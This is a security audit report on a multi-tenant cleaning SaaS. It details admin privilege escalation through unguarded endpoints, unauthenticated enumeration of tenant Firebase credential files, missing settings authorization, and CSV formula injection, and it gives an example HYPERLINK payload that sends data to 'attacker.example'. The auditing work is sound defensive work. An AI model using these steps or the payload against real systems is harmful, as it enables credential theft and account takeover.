# Findings — Phases 8-39 subset: Frontend Security, Perf/DoS, Privacy, Reports/Exports,
# Settings, Admin Ops, Headers/CORS (cleaning_frontend + multitenant_cleaning_backend)

Continuation of `.audit/00-progress.md` / `.audit/05-findings.md`. Scope for this pass: Phases
30, 29, 26, 17, 18, 28, 14 as assigned. `cleaning_frontend` git history checked first
(`git log --oneline` → 288 commits) and `BUGS.md` (614 lines, two prior full-codebase bug
passes) cross-referenced before flagging anything, per instructions — several candidate issues
turned out to already be fixed (see "Checked and confirmed already fixed" at the bottom) and are
not repeated here as findings.

## What's covered / what's not

**Covered with real evidence (file/line, traced controller→service where relevant):**
Phase 28 (admin ops) — deep, two CRITICAL findings, the headline results of this pass.
Phase 18 (settings authorization) — deep, one HIGH + one MEDIUM finding.
Phase 30 (frontend security) — dangerouslySetInnerHTML/innerHTML/document.write sweep, unsafe
URL construction sweep, localStorage/sessionStorage sweep, postMessage sweep, CSV formula
injection (overlaps Phase 17). No exploitable XSS sink found in the frontend itself this pass.
Phase 29 (perf/DoS) — one concrete, deliberately-introduced regression found and traced.
Phase 17 (exports/imports) — CSV formula injection (2 export sites) + import-side validation
gaps in bank-statement CSV import.
Phase 26 (privacy) — one concrete localStorage cross-user-contamination gap; PII-in-URL and
third-party (Google Places) sharing swept and found clean/expected.
Phase 14 (headers/CORS/cookies) — CORS config read and reasoned through; confirmed reasonable
given the app's bearer-token (non-cookie) model. Full cookie/header phase (e.g. HSTS, other
tenant-facing headers beyond what SecurityConfig already showed) not exhaustively re-swept beyond
what's directly relevant to the localStorage-token-theft question the task asked about.

**Not covered / left for a future pass:** Superadmin frontend UI itself beyond auth/routing
(RolesManagement, TenantsManagement, UsersManagement page-level UI bugs, as opposed to the
authorization architecture, which *is* covered and is the critical finding). Full manual review
of every settings tab (Task Library, Site Types, CRM Pipeline, Site Type Templates) beyond the
authorization-gate spot-check that found the PublicHoliday/LabourCostProfile/UserFieldRequirements
issues. Deeper perf profiling (no rendered-DOM-size/timing measurements taken — findings are
static-code-based: "will scale badly" rather than "measured N ms"). No live HTTP requests were
made against a running backend instance (no DB available in this environment) — the two Phase 28
CRITICAL findings are established via full static trace of the Spring Security configuration and
controller code, the same methodology the prior audit pass used for Phase 6 (Tenant Isolation),
and that limitation is stated explicitly per finding rather than presented as a live pentest.

---

# Phase 28 — Admin Ops (SuperAdmin app)

## ADMIN-001 — SuperAdmin's entire "Roles Management" / per-module permission system is enforced only in the frontend; the backend has zero authorization check on any `/admin/**` endpoint beyond "is this a valid superadmin JWT" — full self-privilege-escalation and cross-account-takeover chain (CRITICAL)

**Evidence:**
- Frontend gate is real-looking but client-side only: `cleaning_frontend/src/superadmin/contexts/PrivateRoute.tsx` (L18-36) computes `allowedPaths` from `user.moduleList` and redirects to `/403` if the current route isn't in the operator's granted module list. This is backed by a real DB-driven role/permission model —
  `cleaning_frontend/src/superadmin/pages/private/rolesManagement/RolesManagement.tsx`,
  `AddEditRoles.tsx`, `RolePermission.tsx` let a superadmin create roles and assign specific
  modules to each one (`multitenant_cleaning_backend/src/main/java/com/cleaning/backend/superadmin/entity/SuperAdminRoles.java`,
  `AdminRoleController.java` — `GET/PUT modules/{roleId}`).
- **The backend never checks this anywhere.** `grep -rn "@PreAuthorize\|hasRole\|hasAuthority\|SecurityContextHolder\|getAuthentication\|checkPermission\|hasModule" src/main/java/com/cleaning/backend/superadmin/controller/` → **zero matches** across all 7 controllers
  (`AdminAuthController`, `AdminRoleController`, `AdminUserController`, `TenantController`,
  `TenantFirebaseSettingsController`, `TenantMailSettingsController`, `WebsiteController`).
- `SuperAdminJwtFilter.java` (L26-70) — the only gate on `/admin/**` — does nothing but validate
  the JWT signature/expiry and set `SecurityContextHolder`'s authentication; it does not read or
  check `roleId`/module claims at all. `SecurityConfig.adminSecurity()` (L53-67) is
  `.requestMatchers(SecurityUtilAdmin.urls()).permitAll().anyRequest().authenticated()` — same
  blanket "logged in" gate pattern as the tenant app's already-documented AUTHZ-001, but here
  there isn't even a manual per-controller `isClient()`-style check backing it up — literally
  nothing.

**Concrete exploit chain (traced end to end, not just architectural):**
1. `AdminUserController.updateUser(userId, UserRequestPojo)` (`PUT /admin/users/update/{userId}`,
   L29-32) — no authorization check of any kind, takes any `userId` path parameter.
2. `UserRequestPojo.java` (`superadmin/dto/user/UserRequestPojo.java`) has a `@NotNull Long
   roleId` field, directly settable on update, and an optional `password` field ("null value
   means keep the existing password" per the code comment — a non-null value **overwrites it**).
3. Therefore: any authenticated superadmin operator — even one deliberately assigned the most
   restrictive role in the "Roles Management" UI (e.g. read-only dashboard access) — can call
   `PUT /admin/users/update/{theirOwnUserId}` with a `roleId` belonging to the highest-privilege
   role (discoverable via the unguarded `GET /admin/roles/get`) and self-promote to full Super
   Admin. Equivalently, they can call `PUT /admin/roles/modules/{theirCurrentRoleId}`
   (`AdminRoleController.java` L50, also unguarded) to add every module directly to their own
   already-assigned role without even changing `roleId`.
4. The same unguarded update endpoint also lets them set a new `password` on **any other**
   `userId` — full account takeover of any other superadmin operator, including presumably more
   privileged ones, with no ownership check that the caller is updating their own account.
5. From there, every other `/admin/**` capability is reachable with no further gate:
   `TenantController` (`/admin/tenant/create|update|change-status` — full tenant lifecycle, the
   core of the whole multi-tenant SaaS), `TenantFirebaseSettingsController` (upload Firebase
   Admin SDK service-account credentials for any tenant — see ADMIN-002), `TenantMailSettingsController`
   (view/set tenant SMTP configuration and credentials).

**Impact:** The "Roles Management" feature this app visibly ships (a whole CRUD UI for creating
roles and assigning per-module permissions to different superadmin operators) provides **zero**
real security boundary. Any insider with the lowest-privilege superadmin login — a support
agent, a junior ops hire, anyone the business intended to restrict to (say) read-only
tenant-viewing — is, in practice, fully equivalent to the most senior Super Admin, and can also
take over any other admin account's credentials outright. This is a Separation-of-Duties failure
with a concrete, no-tooling-required HTTP call chain, not merely a theoretical gap.

**Status: VERIFIED** by full static trace (frontend gate code, backend controller code, DTO
field, and the exhaustive grep showing zero authorization primitives anywhere in the superadmin
controller package). Not verified via a live HTTP request (no running backend instance available
in this environment) — the code path itself leaves no ambiguity about the outcome, unlike cases
where runtime behavior could plausibly differ from what the code appears to say.

---

## ADMIN-002 — `/uploads/**` is registered as a public static resource handler that falls outside both Spring Security filter chains, exposing every uploaded file — including tenant Firebase Admin SDK service-account credentials at a fully predictable, unauthenticated URL — with no login required at all (CRITICAL)

**Evidence:**
- `common/config/WebConfig.java` (L14-19): a plain `WebMvcConfigurer.addResourceHandlers()`
  registration — `registry.addResourceHandler("/uploads/**").addResourceLocations(location)`
  where `location` is `${file.upload.dir}` (`application.yml`/`application-live.yml`:
  `file.upload.dir: upload/`, same relative root in both profiles).
- `common/config/security/SecurityConfig.java` defines **exactly two** `SecurityFilterChain`
  beans, each scoped with `.securityMatcher("/admin/**")` (L53-67) and
  `.securityMatcher("/tenant/**")` (L72-86) respectively. There is no third, catch-all chain.
  `grep -rn "SecurityFilterChain" src/main/java` → only these two matches anywhere in the
  codebase.
- Spring Security's documented behavior when custom `SecurityFilterChain` beans use explicit
  `securityMatcher()` scoping and no default/catch-all chain is registered: requests that don't
  match *any* configured matcher receive **no security filtering at all** — not even the
  "authenticated" requirement — since `FilterChainProxy` simply skips filter chain application
  for unmatched paths rather than falling back to a secure default. `/uploads/**` does not match
  either `/admin/**` or `/tenant/**`.
- **Confirmed predictable, fixed-name path for the most sensitive file class stored there:**
  `superadmin/service/impl/TenantFirebaseSettingsServiceImpl.upsert()` (L61-70) writes every
  tenant's uploaded Firebase Admin SDK service-account JSON to
  `Paths.get(uploadRootDir, "firebase", "tenant-" + tenantId).resolve("firebase-service-account.json")`
  — i.e. physical path `upload/firebase/tenant-<tenantId>/firebase-service-account.json`, which
  the `/uploads/**` resource handler serves at
  `https://<host>/uploads/firebase/tenant-<tenantId>/firebase-service-account.json`. The filename
  is a hardcoded constant (not a UUID/hash) and `tenantId` is a small sequential integer
  (confirmed via `TenantController`'s `/get-by-id/{id}` path-parameter style elsewhere) — fully
  enumerable with no authentication, e.g. `.../uploads/firebase/tenant-1/...`,
  `.../uploads/firebase/tenant-2/...`, etc.
- The same physical root (`upload/`) is shared by at least 10 other services confirmed via grep
  for the `file.upload.dir` property (`FileServiceImpl`, `ChatMessageController`,
  `SiteTaskServiceImpl`, `IncidentManagementServiceImpl` — WHS injury report attachments,
  `DrivePathResolver`/`DocumentServiceImpl` — tenant compliance documents structured as
  `upload/<tenantId>/documents/<relativeStoragePath>`, `SiteTaskExecutionServiceImpl`,
  `ReportServiceImpl`, `WebsiteController`), so the blast radius extends beyond just the Firebase
  credentials file to chat attachments, incident photos/documents, and compliance documents —
  though those use less predictable per-file identifiers, so their practical brute-forceability
  is lower than the Firebase file's fixed name.
- The application-code-level frontend paths that read these files correctly go through
  authenticated `/tenant/**` endpoints returning a `Resource`/blob (confirmed for
  `DocumentServiceImpl.getFile(id)`, `CustomFieldsSection.tsx`'s `customFieldDocumentUrl`, and
  inspection photos' `api.getPhotoBlob(photoId)` — none of the traced frontend code constructs a
  raw `/uploads/...` URL itself) — but that only means the *application* doesn't advertise the
  unauthenticated path; it does nothing to close it, since the static handler serves the same
  files regardless of how they're referenced.

**Impact:** A Firebase Admin SDK service-account JSON grants (depending on the IAM role bound to
it, typically broad by default for this credential type) server-side access to a tenant's
Firebase/GCP project — sending arbitrary push notifications to that tenant's users at minimum,
and potentially far more (Firestore/Storage/Auth-admin access) depending on how the credential
was scoped when the tenant admin generated it. An external, fully unauthenticated attacker can
retrieve this for **every tenant that has ever configured Firebase push notifications**, just by
iterating small integers in a URL — no login, no token, no prior access of any kind. This is a
strictly worse starting position than AUTHZ-004 (the previously-found unauthenticated invoice
leak), which at least required *some* valid login.

**Status: VERIFIED** via full static trace of `WebConfig`, `SecurityConfig` (both
`SecurityFilterChain` beans read in full), and the file-write path in
`TenantFirebaseSettingsServiceImpl`. **Caveat, stated explicitly:** this was not confirmed by
sending a live unauthenticated HTTP request to a running instance (no DB/running server available
in this sandboxed environment) — it rests on the well-documented Spring Security behavior for
unmatched requests under multiple `securityMatcher`-scoped chains, which is a known, real-world
misconfiguration pattern, not a guess about undocumented framework internals. Recommend this be
the very first thing confirmed with a live `curl` against a real deployment before/while fixing,
given the severity.

---

# Phase 18 — Settings authorization (Master Configuration)

## SETTINGS-001 — `PublicHolidayController` has no authorization check whatsoever — any authenticated user, including CLIENT-role external portal accounts, can create/update/delete the tenant-wide public holiday calendar that feeds payroll rate calculations (HIGH)

**Evidence:**
- `tenant/controller/PublicHolidayController.java` (`/tenant/public-holidays`, full file read):
  `create` (L28-31), `update` (L33-36), `getById` (L38-41), `list` (L43-63), `delete` (L65-69),
  `bulk` (L71-74) — **none** of the six endpoints call `isClient()` or any other check. Compare
  directly against every sibling settings controller in the same package
  (`CrmPipelineStageController`, `QuoteSettingsController`, `SiteTypeController`,
  `SiteTypeTemplateController`, all of which consistently gate mutating endpoints with
  `isClient()` + `isSubcontractor()`) — `PublicHolidayController` is the one outlier with zero
  gating, not a deliberate design choice shared by the rest of the surface.
- Confirmed no hidden check downstream either: `grep -n "isClient|UserTypeEnum|extractUserType|isAdmin|jwtService"` against `PublicHolidayServiceImpl.java` → **zero matches**.
- Frontend (`cleaning_frontend/src/tenants/pages/private/masterConfig/PublicHoliday.tsx`) calls
  `tenantApiClient` directly with no client-side role gate either beyond the route-level
  `master-configuration` exclusion of CLIENT/SUBCONTRACTOR in `TenantsApp.tsx:303` — but since
  the backend has no check at all, even that route gate is irrelevant; any authenticated user
  hitting the API directly (not just via the UI) reaches these endpoints, CLIENT-role users
  included.

**Impact:** Public holidays determine holiday-rate pay in payroll/rostering calculations
tenant-wide. Any authenticated account — including the lowest-privilege CLIENT-portal login,
which is meant to be an external customer with no internal-operations access at all — can delete
the entire holiday calendar, inject fake holiday entries (inflating payroll costs on those dates
tenant-wide), or bulk-overwrite it, with no audit gate stopping them. This is a genuine
integrity/availability threat to a business-critical reference table, reachable by the least
trusted user class in the system.

**Status: VERIFIED** — controller and service both read in full, confirmed no check anywhere in
either layer.

---

## SETTINGS-002 — `LabourCostProfileController` and `UserFieldRequirementsController` are documented as "admin-only" but the actual gate allows any ordinary STAFF or SUPERVISOR user (not just admins) to view and modify them (MEDIUM)

**Evidence:**
- `LabourCostProfileController.java` (`/tenant/labour-cost-profiles`) — class Javadoc (L18-26)
  explicitly says: *"Tenant admin management of labour cost profiles... gated the same way as the
  rest of the sales/costing surface: CLIENT logins are blocked entirely, and SUBCONTRACTOR logins
  ...are blocked."* The actual `isClient()`/`isSubcontractor()` checks (L39-40, L47-48) only
  exclude `UserTypeEnum.CLIENT` and STAFF-typed users whose `Staff.staffType == SUBCONTRACTOR`.
  **Ordinary STAFF (non-subcontractor) and SUPERVISOR users are not excluded** and can call both
  `GET /tenant/labour-cost-profiles` (view every role's base wage + employment burden) and
  `PUT /tenant/labour-cost-profiles/{role}` (edit them) — despite the docstring's explicit "admin
  management" framing and the `adminOnlyResponse()` method name (L72-74) implying an admin-only
  restriction that isn't actually enforced for this user class.
- `UserFieldRequirementsController.java` (`/tenant/user-field-requirements`) — same pattern: class
  Javadoc (L17-22) says the PUT "is restricted to admins the same way as the rest of the settings
  surface," but `update()` (L38-43) uses the identical `isClient()`/`isSubcontractor()`-only gate
  — ordinary STAFF/SUPERVISOR can toggle which Edit-User-Profile fields are tenant-wide required
  vs. optional.
- These feed the Quotation module's cost calculations
  (`LabourCostProfileController.java` L20-21: *"feed the Quotation module's cost calculations"*)
  — i.e. this is pricing-integrity-adjacent data, not cosmetic settings.

**Impact:** This is a narrower instance of the already-documented AUTHZ-002 architectural pattern
(`isClient()`-only gates letting any STAFF through), but concretely located in the
Master-Configuration/Settings surface which the prior audit pass didn't examine, and notably
**contradicts the code's own stated intent** ("admin management," "restricted to admins") — this
reads as an unintentional gap rather than an accepted risk, since the authors clearly *believed*
they were restricting these to admins and wrote comments saying so. An ordinary cleaning-staff
account (the lowest non-client tier) can silently alter the wage rates that feed every future
quotation's costing, or change which profile fields are mandatory tenant-wide.

**Status: VERIFIED** — both controllers and their Javadoc read in full; the discrepancy between
stated intent and actual `UserTypeEnum` check is a direct code read, not an inference.

---

# Phase 30 — Frontend Security Deep-Dive

## Swept and found clean (stated explicitly, not just omitted)

- **`dangerouslySetInnerHTML`**: zero occurrences anywhere in `cleaning_frontend/src`
  (`grep -rn "dangerouslySetInnerHTML"` → no matches).
- **`.innerHTML =` / `document.write`**: only one hit codebase-wide —
  `tenants/pages/private/documentCreator/DocumentCreator.tsx:554`, `exportAsPDF()`. Read in full
  (L544-582): user-supplied `content` and `title` (SOP/SWMS document text a staff member typed)
  are both escaped for `<` before being interpolated into the generated HTML written via
  `win.document.write(...)` into a `window.open("", "_blank", ...)` popup. Since the injection
  points are plain text-node/attribute-adjacent-free contexts (a `<title>` text node, a `<span>`
  text node, and inside a `<pre>` block — never inside an unquoted HTML attribute), escaping only
  `<` is sufficient to prevent tag injection in this specific usage. This is a same-user,
  same-tab popup (opens a new window under the acting user's own session, not stored/served to
  any other user) — even in the counterfactual where the escaping were incomplete, the worst case
  would be self-XSS against the author's own session, not a stored/cross-user vector. **No fix
  needed; flagged only to document it was checked, not skipped.**
- **`postMessage`/`window.addEventListener("message", ...)`**: zero occurrences anywhere in
  `cleaning_frontend/src` — no CSP/postMessage-origin-validation issue exists because the feature
  doesn't exist.
- **Unsafe URL construction / open redirect**: `window.open()` calls (4 total, grepped) all take
  either a hardcoded empty string (`DocumentCreator.tsx`) or a `URL.createObjectURL(blob)` result
  built from a same-origin authenticated API response (`InspectionTab.tsx:640`,
  `CustomFieldsSection.tsx:57`) — none take attacker-influenceable strings. No `javascript:`-URL
  or open-redirect pattern found.
- **PII in URLs/query strings**: `grep -riE "[?&](email|ssn|dob|tfn|bankAccount|password)="` across
  `src` → no matches.
- **Third-party PII sharing (Google Places/Maps)**: confirmed present (`AddressAutocomplete.tsx`,
  `Map.tsx`) and used exactly as intended — sending in-progress address text to Google's
  Places Autocomplete API as the user types an address field. This is inherent to the feature the
  team deliberately added across ~6 commits in the git history (address autocomplete) and sends
  only address text, not other PII fields — not flagged as an issue.

## CSV formula injection in two frontend-generated exports (overlaps Phase 17) (MEDIUM)

**Evidence:**
- `tenants/pages/private/financeManagement/TransactionsList.tsx`, `handleExportLedger()`
  (L64-86): builds a CSV client-side from ledger `description` (free text, can originate from a
  manually-entered transaction or from the CSV bank-statement import flow below) and other
  fields. Each cell is wrapped in double quotes with internal quotes escaped (L75:
  `` `"${String(cell ?? "").replace(/"/g, '""')}"` ``) — this correctly handles CSV
  delimiter/quoting but **does not neutralize a leading `=`, `+`, `-`, or `@`** character, which
  Excel/Google Sheets/LibreOffice Calc treat as a formula trigger regardless of the cell being
  quoted (CSV quoting only affects delimiter parsing, not the spreadsheet application's
  formula-detection logic once the value is parsed out of the quotes).
- `tenants/pages/private/incidentManagement/IncidentManagement.tsx`, `exportCSV()` (L23-42):
  same pattern — `incidentName` and `description` (free-text fields any authenticated staff
  member fills in when filing an incident report) are quote-escaped but not formula-neutralized.

**Impact:** A malicious or compromised low-privilege account (any staff member who can file an
incident report, or enter/import a ledger transaction description) can plant a value like
`=HYPERLINK("http://attacker.example/steal?v="&A1,"Click")` or a DDE/`cmd` payload as an incident
description or transaction description. When a manager later exports and opens that CSV in
Excel (a very plausible workflow for both of these specific exports — ledger reconciliation and
incident reporting are manager-facing review tasks), the formula executes in the manager's
spreadsheet application, subject to that application's own protections (Excel's Protected View
for downloaded files reduces but doesn't eliminate real-world risk, e.g. DDE-based attacks have
historically bypassed it). This is the classic OWASP "CSV Injection" pattern. The standard fix is
prefixing any cell whose first character is `=`, `+`, `-`, or `@` with a `'` (or a space) before
quoting, which was not done in either place.

**Status: VERIFIED** — both export functions read in full; the quoting-without-formula-prefix gap
is a direct code read, not an inference. Not independently confirmed against a live Excel
instance (no environment to test spreadsheet-application behavior here), but the underlying
vulnerability class and the missing mitigation are unambiguous from the code alone.

## Bank-statement CSV import has no size/row-count cap before parsing entirely client-side (LOW, overlaps Phase 29)

**Evidence:** `financeManagement/BankReconciliation.tsx`, `processFile()` (L117-151): accepts any
file ending in `.csv` (no size check), reads it entirely into memory via
`reader.readAsText(file)`, and parses every row with a hand-written RFC 4180 parser (`parseCsv`,
L44+) before rendering all parsed rows into a column-mapping UI — no cap on row count or file
size anywhere in the flow. A very large bank-statement export (or an accidentally/maliciously
huge file selected) would freeze the tab while parsing and then render an unbounded table.
**Status: VERIFIED** for the absence of any size/row cap; not measured for the actual freeze
threshold (no browser profiling done this pass).

## localStorage/sessionStorage sweep — nothing beyond BUGS.md's already-fixed items and one new gap (see PRIVACY-001 below)

Full `localStorage.setItem`/`getItem` inventory taken (44 call sites grepped and reviewed). All
are one of: auth tokens (expected, see Phase 14 discussion below), theme preference, tenant logo
data-URL cache, or short-lived wizard-step IDs. `ToDoList.tsx` — flagged in BUGS.md as storing
under one unscoped key — **confirmed already fixed**: `storageKey` is now
`` `tenant_todos_v3_${user?.username ?? "anonymous"}` `` (L46, with an explicit code comment
citing the exact shared-computer scenario BUGS.md described). One remaining unscoped case found,
not previously flagged — see PRIVACY-001.

---

# Phase 29 — Perf/DoS

## PERF-001 — Client Management ("Company List") pagination was deliberately removed; the page now fetches every client in the tenant unpaginated and renders every matching card at once with no virtualization (MEDIUM)

**Evidence:**
- `git show 701d1ed --stat`: commit message *"Show all Client Management clients on one scrollable
  page — Removes the 12-per-page pagination from the Active/Deactivated client grid - all
  matching clients render at once and the page scrolls instead of paging through them."* — a
  deliberate, recent regression from a previously-paginated state, not an oversight from initial
  development.
- `tenants/pages/private/companyManagement/CompanyList.tsx` (current state, read in full): `const
  { data } = useGetAllCompany();` (L12) with zero query parameters, then two `.filter()` passes
  over the entire in-memory array for the active/deactivated tab and the search box (L18-30), and
  renders every surviving row as a `CompanyCard` in a CSS grid (L79-80) with no
  pagination/windowing of any kind.
- `tenants/api/api.ts:89-93`: `useGetAllCompany()` calls `useApiGet<CompanyResponse>("/company",
  { retry: 0 })` — no `page`/`size`/`limit` query param support at all, confirming the backend
  call itself is unpaginated, not just the render.
- Codebase-wide: `grep -rn "FixedSizeList|react-window|react-virtualized|virtualiz"` across all of
  `src` → **zero matches** — no virtualization library is used anywhere in the frontend, so this
  pattern (fetch-all, render-all) has no fallback protection if a tenant's client list grows
  large.

**Impact:** For a tenant with a large client roster (hundreds to low-thousands of clients — very
plausible for a commercial cleaning company serving many sites/customers over years), every visit
to Client Management fetches the entire company list over the network and mounts a full
`CompanyCard` component (which itself likely does its own data-fetching/formatting — not
independently profiled this pass) for every row simultaneously. This degrades from "page load
delay" toward "tab hang" as the tenant's data grows, and the regression was introduced
deliberately rather than being long-standing (i.e., it's a recent, live risk, not something the
app has always tolerated).

**Status: VERIFIED** — commit diff, current file state, and the API hook's lack of pagination
params all directly read. The exact scale at which this becomes user-visible wasn't measured
(no seeded large dataset / browser profiling available in this environment) — flagged as a
structural risk proportional to future data growth, not a benchmarked number.

---

# Phase 26 — Privacy

## PRIVACY-001 — Injury/incident report wizard persists in-progress record identifiers under globally-scoped (not per-user) localStorage keys, unlike the sibling `ToDoList.tsx` bug that was fixed with per-user scoping (LOW-MEDIUM)

**Evidence:**
- `tenants/pages/private/incidentManagement/Incident.tsx` (L30, L36-40, L120, L143): persists
  `incident_step`, `injured_person_id`, `incident_id`, `reporter_id`, `document_id`, `about_id`
  under fixed, non-user-scoped `localStorage` keys (e.g. `localStorage.setItem("about_id", id ??
  "")` — no per-user suffix anywhere).
- `tenants/pages/private/incidentManagement/components/ReportSummary.tsx` (L59-63) and
  `.../components/Reporter.tsx:64` read these same global keys back as a fallback when a
  navigated row doesn't carry the relational IDs directly.
- Direct contrast: `tenants/pages/private/todoList/ToDoList.tsx` (L44-46) has an explicit,
  commented fix for exactly this category of bug — `` `tenant_todos_v3_${user?.username ??
  "anonymous"}` `` — "Scoped per-user so different users sharing one browser/machine don't see
  (or overwrite) each other's to-do items." The same fix was not applied to the incident wizard's
  IDs, which remain on unscoped keys.
- Note: this is distinct from the "incident-wizard id swap" bug BUGS.md documents as already
  fixed (a within-session `setIncidentId`/`setDocumentId` mixup) — that fix addressed the wizard
  correctly tracking *its own* IDs during a single user's session; it did not address the keys
  being global rather than per-user.

**Impact:** On a shared/kiosk device (plausible for on-site cleaning staff without individually
issued devices — a real deployment pattern for this kind of workforce app), if User A starts
filing an injury incident report and navigates away before finishing, then User B opens the
incident wizard on the same browser, `ReportSummary.tsx`'s fallback can resolve User A's
`injured_person_id`/`about_id`/etc. into User B's flow — potentially attaching a different
person's identity (the "injured person" or "reporter" field, both of which reference a specific
named individual) to the wrong incident record, or letting User B unintentionally view/edit User
A's in-progress draft. This is a data-integrity issue with a privacy dimension (cross-user
exposure of WHS-incident-linked personal references) rather than a severe standalone leak, and
the same shared-device threat model was explicitly already recognized and fixed for
`ToDoList.tsx` in the same codebase.

**Status: VERIFIED** for the unscoped-key fact (direct code read, both files). The real-world
frequency (how often the same browser is actually shared between two users during an in-progress
draft) wasn't and can't be measured statically — flagged as a latent gap consistent with a
pattern the team has already fixed once elsewhere, not an observed incident.

## Swept and found clean: PII in URLs

`grep -riE "[?&](email|ssn|dob|tfn|bankAccount|password)="` across all of `src` → no matches. No
route/query-param pattern carrying PII was found.

---

# Phase 14 — Headers / CORS / Cookies (as they affect the frontend)

## Confirmed reasonable: CORS wildcard is mitigated by `allowCredentials(false)` + bearer-token auth model

**Evidence:** `common/config/security/SecurityConfig.java` `corsConfigurationSource()` (L138-150)
and the duplicate `corsFilter()` bean (L152-167): both set `config.setAllowCredentials(false)`
alongside `setAllowedOriginPatterns(resolvedOrigins())`, where `resolvedOrigins()` reads
`cors.allowed-origins` — `application.yml` (dev/default profile) falls back to `*` if unset,
`application-live.yml:60` requires the env var `CORS_ALLOWED_ORIGINS` with **no fallback**
(fails to start rather than silently defaulting to `*` in the profile that's supposed to run in
production). Because the app authenticates via a `Bearer` header (JWT in `Authorization`, not a
cookie — confirmed throughout `apiClients.ts` in both `tenants/api/` and `superadmin/api/`,
Phase 14/30 localStorage sweep above), there's no cookie-based CSRF surface, and
`allowCredentials(false)` means a wildcard-origin response can't be combined with credentialed
requests per the CORS spec/browser enforcement either. This is a coherent, intentionally-reasoned
setup (the SecurityConfig code even has an explanatory comment about the CSP/header rationale
nearby), not an oversight. **No new finding here** — included because the task explicitly asked
about it.

## Tokens in localStorage vs. XSS — risk remains architectural, not concretely exploitable given this pass's findings

The task asked whether localStorage-stored tokens (`accessToken`/`refreshToken`, confirmed stored
there in both `tenants/` and `superadmin/` API clients and `AuthContext`s) are meaningfully at
risk given Phase 30's findings. This pass's XSS sweep (dangerouslySetInnerHTML, innerHTML,
document.write — see Phase 30 above) found **no exploitable injection sink** anywhere in the
frontend — the one `document.write` call properly escapes its inputs for the context it's used
in. So while storing bearer tokens in `localStorage` rather than an `httpOnly` cookie is a
standard defense-in-depth gap (any *future* XSS bug would have direct token-theft consequences,
whereas an `httpOnly` cookie would not be readable by injected script), this pass did not find a
concrete XSS vector that would make that theoretical risk live today. Recorded as a
defense-in-depth observation, not a standalone finding requiring its own severity rating.

---

# Checked and confirmed already fixed (not re-flagged as findings)

- `ToDoList.tsx` unscoped localStorage key (BUGS.md) — fixed, per-user scoping present with an
  explicit comment (see Phase 30/26 above).
- "Incident-wizard id swap" (`setIncidentId` where `setDocumentId` was meant) — BUGS.md's own
  follow-up pass (2026-08-14 entry) already confirmed this fixed; not re-verified line-by-line
  this pass since it's out of this pass's assigned phases, but not re-flagged either.
- `xlsx` dependency (DEP-001, `.audit/05-findings.md`) — separately already remediated per commit
  `b43621e` visible in `git log`.

---

# Summary table

| ID | Phase | Severity | One-line |
|---|---|---|---|
| ADMIN-001 | 28 | CRITICAL | SuperAdmin RBAC is frontend-only; any admin login can self-escalate to full Super Admin and take over any other admin account via unguarded `/admin/users/update/{userId}` + `/admin/roles/modules/{roleId}`. |
| ADMIN-002 | 28/14 | CRITICAL | `/uploads/**` static handler bypasses both Spring Security filter chains entirely; tenant Firebase service-account credentials sit at a fully predictable, unauthenticated URL. |
| SETTINGS-001 | 18 | HIGH | `PublicHolidayController` has zero authorization check on create/update/delete/bulk — reachable by CLIENT-role accounts. |
| SETTINGS-002 | 18 | MEDIUM | Labour Cost Profiles + User Field Requirements are documented "admin-only" but actually allow any ordinary STAFF/SUPERVISOR to view+modify. |
| CSV-INJ-001 | 17/30 | MEDIUM | CSV formula injection in TransactionsList and IncidentManagement client-side exports — quoted but not formula-neutralized. |
| PERF-001 | 29 | MEDIUM | Client Management pagination deliberately removed; unpaginated, unvirtualized full-fetch-and-render. |
| PRIVACY-001 | 26 | LOW-MEDIUM | Incident wizard's in-progress record IDs (including a named "injured person") stored in unscoped localStorage keys, unlike the sibling ToDoList bug already fixed this way. |
| (note) | 29/17 | LOW | Bank-statement CSV import has no file-size/row-count cap before full in-memory parse + unbounded render. |
